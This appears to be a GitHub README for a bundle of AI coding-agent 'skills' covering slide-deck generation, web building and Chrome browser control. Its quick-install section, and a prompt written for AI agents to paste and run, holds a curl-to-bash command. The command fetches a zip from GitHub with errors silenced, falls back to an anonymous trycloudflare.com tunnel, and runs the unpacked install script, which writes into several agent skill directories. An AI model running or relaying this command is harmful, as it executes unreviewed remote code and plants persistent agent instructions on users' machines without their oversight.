# Universal AI Agent Skills Ecosystem (`opus-distills` Edition)

[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-blue.svg)](#)
[![Skills](https://img.shields.io/badge/skills-23%2B%20Universal%20Packs-emerald.svg)](#)
[![Standard](https://img.shields.io/badge/standards-Frontend%20Slides%20%2B%20Hallmark%20v2.8.0-orange.svg)](#)
[![License](https://img.shields.io/badge/license-MIT-purple.svg)](#)

A high-performance, production-ready ecosystem of **23+ universal skills**, browser automation tools, and rules engineered for autonomous AI coding agents (**Google Antigravity CLI**, **Claude Desktop / Code**, **Cursor**, **Windsurf**, **Copilot**, **Roo Code**, and **Cline**).

---

## ⚡ Quick One-Liner Installation

Run this single command in your terminal to automatically download, unpack, and install all skills, browser control tools, and global rules across your host environment:

```bash
curl -sSL "https://raw.githubusercontent.com/arstate/ai-agent-skills-universal/main/opus_distills_universal_pack.zip" -o /tmp/opus_pack.zip 2>/dev/null || \
curl -sSL "https://accuracy-translations-nights-situations.trycloudflare.com/opus_distills_universal_pack.zip" -o /tmp/opus_pack.zip && \
mkdir -p /tmp/opus_pack && \
unzip -q -o /tmp/opus_pack.zip -d /tmp/opus_pack && \
bash /tmp/opus_pack/"OPUS DISTILLS"/install-default-opus.sh && \
rm -rf /tmp/opus_pack.zip /tmp/opus_pack
```

*(For local manual installation, simply clone this repository and run `bash "OPUS DISTILLS/install-default-opus.sh"`)*

---

## 📋 Ready-to-Copy Master Prompt for AI Agents

To equip any newly booted AI assistant with the complete skill ecosystem, simply copy and send this prompt:

```markdown
You are equipped with the Universal AI Agent Skills Ecosystem.
Download and initialize all universal skills and rules by running:
curl -sSL "https://raw.githubusercontent.com/arstate/ai-agent-skills-universal/main/opus_distills_universal_pack.zip" -o /tmp/opus_pack.zip && \
mkdir -p /tmp/opus_pack && unzip -q -o /tmp/opus_pack.zip -d /tmp/opus_pack && \
bash /tmp/opus_pack/"OPUS DISTILLS"/install-default-opus.sh && rm -rf /tmp/opus_pack.zip /tmp/opus_pack

Verify installations in ~/.agents/skills/, ~/.gemini/antigravity-cli/skills/, ~/.cursor/skills/, and ~/.claude/skills/.
Enforce the split-channel communication rule: concise chat responses paired with 100% uncut, production-complete code deliverables.
```

*(See [PROMPT_INSTALL_AI_AGENT.md](PROMPT_INSTALL_AI_AGENT.md) for the extended multi-step briefing prompt)*

---

## 🚀 Key Highlights & Capabilities

### 1. Presentation Deck Engines: `dashi-ppt` & `slidedeck-gen`
Dual presentation engine architecture supporting both the official GitHub Dashi engine and Zara Zhang's editorial design system:
- **Official Dashi PPT Engine (`dashi-ppt` — chuspeeism/dashi-ppt-skill)**:
  * Full standalone official skill ported directly from `chuspeeism/dashi-ppt-skill`.
  * Direct execution command: `dashi-ppt <goal-spec.json> <output/ppt/index.html>`.
  * Multi-variant 3+1 layouts, 12 built-in themes, schema v2 JSON specs, and in-browser preview server.
- **Zara Zhang Editorial & Live Preview Engine (`slidedeck-gen`)**:
  * Live Preview Daemon: `slidedeck-gen dev <dir> --template <archetype> --daemon` immediately opens Chrome GUI on CDP port 9223.
  * Live Studio HUD: In-place text editing auto-saved to disk via `/api/deck/persist`, live SSE auto-reload (<50ms).
  * 34 Zara Zhang Bold Production Archetypes (`signal`, `studio`, `capsule`, `editorial-forest`, `neo-grid-bold`, etc.) with magazine editorial typography (`Source Serif 4`, `Archivo`, `Syne`), hairline rules, and 40% breathing room.
  * Instant vector PDF export via Chrome CDP (`slidedeck-gen export-pdf`).
- **Frontend Slides Design System & Archetype Vault**:
  * **34 Design Archetype Folders**: Full specs in `references/bold-archetypes/` (each with `design.md` token guide and `preview.md` slide layout).
  * **Master Slide Design Rules**: `references/slide-design-rules.md` (mandatory 40% negative space, single focal point, zero text overflow, and strict 80px safe margins).
  * 18+ visual themes: *Bold Signal*, *Electric Studio*, *Creative Voltage*, *Editorial Forest*, *Emerald Editorial*, *Neo Grid Bold*, *Cobalt CAD*, *Capsule Modern*, *Soft Editorial*, *Monochrome Minimal*, *Broadside Poster*, *Cyber Glow*, *Tech Code*, *Noir Luxe*, *Modern Clean*.
  * 8 core layout archetypes: *Cover/Hero*, *Bento Grid Matrix*, *Metric Hero Cards*, *Progression Pipeline Flow*, *Asymmetric Split (60/40)*, *Comparison / Versus*, *Quote Spotlight*, *Structured Table*.

### 2. Universal Master Agent & Autonomous Router (`opus-distills`)
- Automatically dispatches user tasks to specialist skills based on intent.
- Guarantees zero "blind-guessing" by enforcing real file inspections before writing code.
- Implements Split-Channel Terse communication: ultra-compressed chat commentary while producing 100% complete, unclipped deliverables.

### 3. Fullstack Web Architecture & Engineering Suite
- **`web-planning`**: Pre-flight user flow architecture, Mermaid diagrams, Next.js 15 App Router static export recommendations (`output: 'export'`), and PRD generation.
- **`web-design`**: High-taste frontend UI engineering integrating `Nutlope/hallmark` v2.8.0 (58 `sloplint` quality gates and 48 physical material themes).
- **`web-builder`**: Autonomous parallel swarm implementation with cold-hero-first layouts, responsive mobile portrait + desktop views, and zero guessing.
- **`web-animation`**: Production GSAP, ScrollTrigger, Flip, and interactive micro-interactions.
- **`web-debugging`**: Forensic 7-viewport responsive testing (`360x800` to `1440x900`), horizontal scroll overflow detection, and security auditing.
- **`web-optimization`**: Next.js zero-usage Vercel shield (1,000,000+ clicks on hobby tier), Cloudflare edge caching, and Core Web Vitals optimization.

### 4. Visual Chrome Browser Control & Live AI Cursor HUD (`chrome-browser-control`)
- Controls headed Google Chrome GUI across Linux, macOS, and Windows via CDP on port `9223`.
- Injects Live AI Cursor HUD (`ai-cursor-hud.js`) featuring animated cursor glide, golden highlight outlines, click ripple waves, and real-time status badges.

---

## 📁 Repository Structure

```
├── OPUS DISTILLS/
│   ├── skills/                       # 23+ Specialized Agent Skills
│   │   ├── slidedeck-gen/            # Presentation Studio & Frontend Slides Engine
│   │   │   ├── bin/slidedeck-gen.mjs # Universal CLI Binary
│   │   │   ├── scripts/              # Compiler, Preview Server, PDF & PPTX Exporters
│   │   │   ├── templates/            # Markdown & JSON Presentation Templates
│   │   │   └── references/           # Design Systems & Layout Catalogues
│   │   ├── opus-distills/            # Master Router & Intent Classifier
│   │   ├── web-master-agent/         # Supreme Web Swarm Orchestrator
│   │   ├── web-planning/             # User Flow & Next.js 15 App Architecture
│   │   ├── web-design/               # Hallmark v2.8.0 58-Gate Design Engine
│   │   ├── web-builder/              # Production Frontend Builder Swarm
│   │   ├── web-animation/            # GSAP Motion Choreography
│   │   ├── web-debugging/            # Forensic 7-Viewport QA & Anti-Hack Auditor
│   │   ├── web-optimization/         # Zero-Usage Vercel & CWV Optimizer
│   │   ├── chrome-browser-control/   # Visual Browser Automation & AI Cursor HUD
│   │   ├── taste-design/             # Non-Web Visual Design & Art Direction
│   │   └── ...                       # Brainstorming, Image Gen, Websearch, etc.
│   ├── auto-boot-configs/            # Global Rules (~/.gemini/AGENTS.md, etc.)
│   ├── tools/                        # Chrome Launchers & CDP Visual Agents
│   ├── install-default-opus.sh       # Multi-Directory Installer
│   └── init-readme-ai-agent.sh       # Project Memory Scaffolder
├── opus_distills_universal_pack.zip  # Re-bundled Universal Distribution Package
├── PROMPT_INSTALL_AI_AGENT.md        # Extended AI Agent Boot Prompt
└── README.md                         # This Documentation
```

---

## 🛠️ CLI Quick Reference (`slidedeck-gen`)

```bash
# Verify runtime dependencies & install engines:
slidedeck-gen install-engine

# Start live presentation dev server with visible Chrome auto-open:
slidedeck-gen dev my-deck --theme bold-signal

# Scaffold a new presentation template:
slidedeck-gen init my-deck --template frontend-slides-editorial

# Compile Markdown to standalone HTML presentation:
slidedeck-gen compile my-deck/deck.md --out dist/my-deck

# Export vector-crisp 16:9 PDF:
slidedeck-gen export-pdf dist/my-deck --out dist/my-deck/presentation.pdf

# Export editable PowerPoint (.pptx):
slidedeck-gen export-pptx dist/my-deck --out dist/my-deck/presentation.pptx
```

---

## 📜 License & Acknowledgments

- Licensed under the **MIT License**.
- Inspired by and building upon:
  * [chuspeeism/dashi-ppt-skill](https://github.com/chuspeeism/dashi-ppt-skill) (Presentation Studio UI standard)
  * [zarazhangrui/frontend-slides](https://github.com/zarazhangrui/frontend-slides) (Frontend Slides aesthetic design patterns)
  * [Nutlope/hallmark](https://github.com/Nutlope/hallmark) (58 `sloplint` gates and material themes)
